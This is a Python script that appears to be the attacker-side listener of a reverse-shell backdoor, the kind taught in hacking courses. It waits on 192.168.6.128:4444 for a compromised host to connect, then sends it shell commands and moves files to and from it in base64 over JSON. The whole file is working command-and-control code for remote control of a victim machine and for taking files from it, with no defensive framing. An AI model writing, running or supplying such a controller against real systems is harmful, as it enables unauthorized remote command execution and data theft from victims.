#!/usr/bin/env python

import socket, json , base64, os

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        print("[+] Waiting for incoming connections")
        listener.listen(0)  # Listen for incoming connections, with a backlog of 1
        self.connection, address = listener.accept()  # Accept an incoming connection
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        if command[0] == "exit":
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ").split()
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                result = self.execute_remotely(command)
                if command[0] == "download":
                    result = self.write_file(command[1], result)
            except Exception as e:
                print("[-] Error during command execution:", e)
                result = "[-] Error during command execution."
            print(result)


my_listener = Listener("192.168.6.128", 4444)
my_listener.run()
